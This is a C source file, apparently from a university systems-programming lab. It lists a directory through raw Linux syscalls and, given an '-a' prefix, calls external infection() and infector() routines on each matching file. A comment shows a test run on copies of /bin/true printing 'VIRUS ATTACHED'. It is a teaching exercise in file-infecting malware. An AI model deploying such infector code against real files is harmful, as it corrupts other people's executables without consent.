#include "util.h"

#define SYS_GETDENTS 141
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_WRITE 4
#define STDOUT 1
#define O_RDONLY 0
#define BUFFER_SIZE 8192

extern void infection();
extern void infector(char *filename);
extern int system_call();

struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

int prefix_match(const char *filename, const char *prefix)
{
    while (*prefix)
    {
        if (*prefix != *filename)
            return 0;
        prefix++;
        filename++;
    }
    return 1;
}

int main(int argc, char *argv[], char *envp[])
{
    char buffer[BUFFER_SIZE];
    int nread, i = 0;
    struct linux_dirent *d;
    char *prefix = 0;

    if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'a')
    {
        prefix = argv[1] + 2;
    }

    int fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0)
        return 0x66;

    nread = system_call(SYS_GETDENTS, fd, buffer, BUFFER_SIZE);
    if (nread < 0)
        return 0x66;

    while (i < nread)
    {
        d = (struct linux_dirent *)(buffer + i);
        char *filename = d->d_name;

        if (!prefix || prefix_match(filename, prefix))
        {
            system_call(SYS_WRITE, STDOUT, filename, strlen(filename));
            if (prefix)
                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", 16);
            else
                system_call(SYS_WRITE, STDOUT, "\n", 1);

            if (prefix)
            {
                infection();
                infector(filename);
            }
        }
        else
        {
            system_call(SYS_WRITE, STDOUT, filename, strlen(filename));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }

        i += d->d_reclen;
    }

    system_call(SYS_CLOSE, fd);
    return 0;
}

/*


cp /bin/true testfile1
cp /bin/true testfile2
chmod +w testfile1 testfile2



caspl202@caspl202-lubuntu:/media/sf_labs/lab 3/lab 3/task2$ ./virus -atestfile
testfile1 VIRUS ATTACHED
Hello, Infected File
testfile1
testfile2Hello, Infected File
testfile2




*/